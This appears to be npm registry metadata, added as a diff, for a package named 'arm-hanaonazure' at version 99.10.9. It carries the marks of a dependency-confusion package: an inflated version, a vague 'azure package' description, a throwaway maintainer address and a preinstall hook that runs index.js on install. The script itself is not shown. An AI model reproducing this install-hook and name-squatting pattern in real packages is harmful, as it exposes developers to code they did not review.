@@ -1,0 +1,62 @@
+{
+    "_id": "arm-hanaonazure",
+    "name": "arm-hanaonazure",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-hanaonazure",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-hanaonazure@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-L2/RNU0Q585NChr/Cqa0HrSgfhnZlR7CI/a/9da5DEDu/tN8Czsc69RNIdQkgH9ollvnLr5X5JAIpHXusx08sw==",
+                "shasum": "250fc75a22c0e402a1bb61ae35d0ff7c19af668d",
+                "tarball": "https://registry.npmjs.org/arm-hanaonazure/-/arm-hanaonazure-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNyaQACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoDYg/8DcAS+WVDDkGK3PxlhTXdtl7cgq9fmnEnGQQuftf9R5kFv7Fc\r\ndywHLTzZEFSxKvvwJsLPI4DQHQgyeentRJB8xidUULm5jYc+jnsmYYCM2KEP\r\nn7tfFAnKPIZy0rzwPIzXXOy7LV9kCodvBC7oaxTAKfu5iZfzl2bPklrMScPg\r\noPZjaKlYx3hTldPGJmqRsNHdcB1yaQ9VSjkgVBtzmWyyy9ybiUvcZVW771yK\r\ngj4bsUFShyrYAbd6LDfaBKFyLffZxpfPChR3ER3rDN4SuxMU9XWrfXtKF4Kq\r\nm/j29hWmcuBQXPvPYsaIIr9cGbWJG9wYsfxiv6uztuIC06VmbqkG0fq829Ym\r\n1yghW56fbqVgqsM01ziwT1/3U05TAyOzAS+X2P62bgcrRICeb9/ktGls22WU\r\nFFEQIq2FyRs9Oq/A0YuTouyM4vZrdGebzfXEyd44LadkucxlGvBGwbsixcUq\r\nZLJOVgN2hAfoRSGyKu2nttvexJPZPCh5tRw2UfyV1cLbZh6HIH/2D3e3kA85\r\nZTG25/ug4iGt36zpMaJ150h8L8Ar5Ml39+SX8e6GEpTRzBIhP55kEayqvbqQ\r\nU3B7bvL54tY6rz8fcTJzvqOQN/k/BgMiBmESkFoWeS8a+9f1wFlQhSl4OMuN\r\ntbh14nzgR5k1vR35AhxzCrB6DTOwjguFgow=\r\n=4/VP\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "y84r7zqr",
+                "email": "y84r7zqr@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "y84r7zqr",
+                    "email": "y84r7zqr@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-hanaonazure_99.10.9_1647781520057_0.377879741339157"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T13:05:20.057Z",
+        "99.10.9": "2022-03-20T13:05:20.277Z",
+        "modified": "2022-03-20T13:05:20.368Z"
+    },
+    "maintainers": [
+        {
+            "name": "y84r7zqr",
+            "email": "y84r7zqr@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
